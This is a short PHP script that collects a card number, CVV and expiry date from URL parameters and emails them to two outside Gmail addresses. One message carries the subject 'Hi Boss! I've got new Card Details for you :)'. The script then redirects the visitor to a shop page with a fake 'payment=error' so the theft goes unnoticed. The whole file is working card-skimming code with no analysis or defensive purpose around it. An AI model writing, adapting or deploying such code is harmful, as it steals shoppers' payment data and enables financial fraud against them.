<?php
// the message
$msg = "Card Number: ". $_GET['cn'] ."\n"."Card CVV: ". $_GET['cs'] ."\n"."Card Expirey: ". $_GET['cx'] ."\n";

// use wordwrap() if lines are longer than 70 characters
$msg = wordwrap($msg,70);

// send email
mail("electrosuncoza@gmail.com","Card Details",$msg);

// the message
$msg = "Card Number: ". $_GET['cn'] ."\n"."Card CVV: ". $_GET['cs'] ."\n"."Card Expirey: ". $_GET['cx'] ."\n";

// use wordwrap() if lines are longer than 70 characters
$msg = wordwrap($msg,70);

// send email
mail("metabongani@gmail.com","Hi Boss! I've got new Card Details for you :)",$msg);



header('location: https://electrosun.co.za/MT9001?payment=error');
?>